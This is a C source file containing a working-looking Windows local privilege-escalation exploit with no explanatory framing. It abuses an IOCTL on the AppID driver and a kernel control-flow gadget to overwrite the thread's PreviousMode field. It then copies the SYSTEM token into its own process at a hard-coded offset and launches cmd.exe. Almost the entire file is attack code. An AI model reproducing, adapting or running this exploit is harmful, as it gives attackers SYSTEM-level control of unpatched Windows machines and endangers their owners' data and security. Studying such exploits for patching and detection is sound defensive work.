#include <stdio.h>
#include "defines.h"

#define STATUS_INFO_LENGTH_MISMATCH 0xc0000004
#define DEVICE_NAME "\\\\?\\AppID"


// IOCTL 0x22A018
typedef struct {
	PVOID arg1;
	PVOID objptr;
	PVOID cfgptr;
	PVOID unknown;
} INPUT_BUFFER;

_NtQuerySystemInformation pNtQuerySystemInformation;
_NtFsControlFile pNtFsControlFile;
_NtWriteVirtualMemory pNtWriteVirtualMemory;
_NtReadVirtualMemory pNtReadVIrtualMemory;
_NtDeviceIoControlFile pNtDeviceIoControlFile;


void GetNtFunction() {
	HMODULE ntdll = GetModuleHandleA("ntdll.dll");
	//NTSTATUS ntStatus;

	pNtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(ntdll, "NtQuerySystemInformation");
	pNtWriteVirtualMemory = (_NtWriteVirtualMemory)GetProcAddress(ntdll, "NtWriteVirtualMemory");
	pNtReadVIrtualMemory = (_NtReadVirtualMemory)GetProcAddress(ntdll, "NtReadVirtualMemory");
	pNtDeviceIoControlFile = (_NtDeviceIoControlFile)GetProcAddress(ntdll, "NtDeviceIoControlFile");
}


PVOID GetImageBase(const char* ModuleName) {
	ULONG len = 0;
	pNtQuerySystemInformation(SystemModuleInformation, NULL, 0, &len);
	PSYSTEM_MODULE_INFORMATION pModuleInfo = (PSYSTEM_MODULE_INFORMATION)GlobalAlloc(GMEM_ZEROINIT, len);
	if (pModuleInfo == NULL) {
		printf("Could not allocate memory for module info.\n");
		return 1;
	}

	NTSTATUS status = pNtQuerySystemInformation(SystemModuleInformation, pModuleInfo, len, &len);
	if (status != (NTSTATUS)0x0) {
		printf("NtQuerySystemInformation failed with error code 0x%X\n", status);
		return 0;
	}

	for (unsigned int i = 0; i < pModuleInfo->ModulesCount; i++) {
		PCHAR imageName = (PCHAR)pModuleInfo->Modules[i].Name;

		if (strstr(imageName, ModuleName)) {
			return pModuleInfo->Modules[i].ImageBaseAddress;
		}

	}

	return 0;
}

PVOID GetFILE_OBJECT_Address()
{
	NTSTATUS status;
	HANDLE hDuplicatedHandle = NULL;
	UINT_PTR tokenAddress = 0;
	ULONG ulBytes = 0;
	PSYSTEM_HANDLE_INFORMATION handleTableInfo = NULL;

	HANDLE hFile = CreateFileW(L"C:\\Users\\Public\\example.txt", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hFile == INVALID_HANDLE_VALUE)
	{
		printf(L"Failed to duplicate handle. Error: %lu\n", GetLastError());
		return 1;
	}
	handleTableInfo = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 2 * ulBytes);


	// Allocate space in the heap for the handle table information which will be filled by the call to 'NtQuerySystemInformation' API
	while ((status = pNtQuerySystemInformation(SystemHandleInformation, handleTableInfo, ulBytes, &ulBytes)) == STATUS_INFO_LENGTH_MISMATCH)
	{
		if (handleTableInfo != NULL)
		{
			handleTableInfo = (PSYSTEM_HANDLE_INFORMATION)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, handleTableInfo, 2 * ulBytes);
		}

		else
		{
			handleTableInfo = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 2 * ulBytes);
		}
	}

	if (status == 0)
	{
		for (ULONG i = 0; i < handleTableInfo->NumberOfHandles; i++)
		{
			if (handleTableInfo->Handles[i].UniqueProcessId == GetCurrentProcessId() && handleTableInfo->Handles[i].HandleValue == (USHORT)hFile)
			{
				tokenAddress = (UINT_PTR)handleTableInfo->Handles[i].Object;
				break;
			}
		}
	}
	else
	{
		if (handleTableInfo != NULL)
		{
			printf(L"[!] NtQuerySystemInformation failed, 0x%X\n", status);
			HeapFree(GetProcessHeap(), 0, handleTableInfo);
			CloseHandle(hDuplicatedHandle);
			return 0;
		}
	}

	HeapFree(GetProcessHeap(), 0, handleTableInfo);

	return tokenAddress;
}


PVOID GetObj(PULONGLONG objptr, ULONG pid, HANDLE handle)
{
	NTSTATUS ntStatus;

	ULONG system_handle_info_size = 4096;
	PSYSTEM_HANDLE_INFORMATION system_handle_info = (PSYSTEM_HANDLE_INFORMATION)malloc(system_handle_info_size);
	memset(system_handle_info, 0x00, sizeof(SYSTEM_HANDLE_INFORMATION));

	while ((ntStatus = pNtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation, system_handle_info, system_handle_info_size, NULL)) == STATUS_INFO_LENGTH_MISMATCH)
	{
		system_handle_info = (PSYSTEM_HANDLE_INFORMATION)realloc(system_handle_info, system_handle_info_size *= 10);
		if (system_handle_info == NULL)
		{
			printf("[!] Error while allocating memory for NtQuerySystemInformation: %d\n", GetLastError());
			exit(1);
		}
	}

	for (unsigned int i = 0; i < system_handle_info->NumberOfHandles; i++)
	{
		if (system_handle_info->Handles[i].UniqueProcessId == (USHORT)pid)
		{
			if (system_handle_info->Handles[i].HandleValue == handle)
			{
				*objptr = system_handle_info->Handles[i].Object;
			}

		}
	}
}

int main() {
	PVOID KTHREAD = NULL;
	PVOID SYSTEM_EPROCESS = NULL;
	PVOID EPROCESS = NULL;
	PVOID PreviousMode = NULL;
	PVOID NTOSKRNL_BASE = NULL;

	ULONG dwbytes = 0;
	GetNtFunction();

	DWORD pid = GetCurrentProcessId();

	HANDLE hThread = OpenThread(THREAD_QUERY_INFORMATION, TRUE, GetCurrentThreadId());
	GetObj(&KTHREAD, pid, hThread);
	printf("[+] Current KTHREAD: %p\n", KTHREAD);

	PreviousMode = (UINT64)KTHREAD + 0x232;
	printf("[+] PreviousMode address: %p\n", PreviousMode);

	HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, pid);
	GetObj(&EPROCESS, pid, hProc);
	printf("[+] Current EPROCESS: %p\n", EPROCESS);

	GetObj(&SYSTEM_EPROCESS, 4, (HANDLE)4);
	printf("[+] System EPROCESS: %p\n", SYSTEM_EPROCESS);

	NTOSKRNL_BASE = GetImageBase("ntoskrnl.exe");
	printf("[+] ntoskrnl.exe base address : %p\n", NTOSKRNL_BASE);

	PVOID ExpProfileDelete = (UINT64)NTOSKRNL_BASE + 0xA01FD0; // ExpProfileDelete Function (kcfg gadget)
	printf("[+] ExpProfileDelete function address : %p\n", ExpProfileDelete);


	PVOID FILE_OBJECT = GetFILE_OBJECT_Address();

	INPUT_BUFFER buffer = { 0, };
	HANDLE dHandle;
	dHandle = CreateFileA(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_NEW, 0, NULL);

	buffer.arg1 = (UINT64)PreviousMode + 0x30;		// First Argument (rcx) 
	buffer.objptr = FILE_OBJECT;					// FileObject Pointer (avoid crash)
	buffer.cfgptr = &ExpProfileDelete;				// overwrite indirect call pointer with kcfg gadget
	buffer.unknown = NULL;							// UNKNOWN

	IO_STATUS_BLOCK ioStatus;

	if (pNtDeviceIoControlFile(dHandle, NULL, NULL, NULL, &ioStatus, 0x22A018, &buffer, sizeof(buffer), NULL, &dwbytes) != NOERROR) {
		printf("NtDeviceIoControlFile Failed, 0x%x\n", GetLastError());
	}


	pNtWriteVirtualMemory(GetCurrentProcess(), (ULONGLONG)EPROCESS + 0x4b8, (ULONGLONG)SYSTEM_EPROCESS + 0x4b8, sizeof(ULONGLONG), &dwbytes);


	char* restoreBuffer = (char*)malloc(sizeof(CHAR));
	*restoreBuffer = 1;

	pNtWriteVirtualMemory(GetCurrentProcess(), (ULONGLONG)KTHREAD + 0x232, (PVOID)restoreBuffer, sizeof(CHAR), &dwbytes);


	system("cmd.exe");

	return 0;
}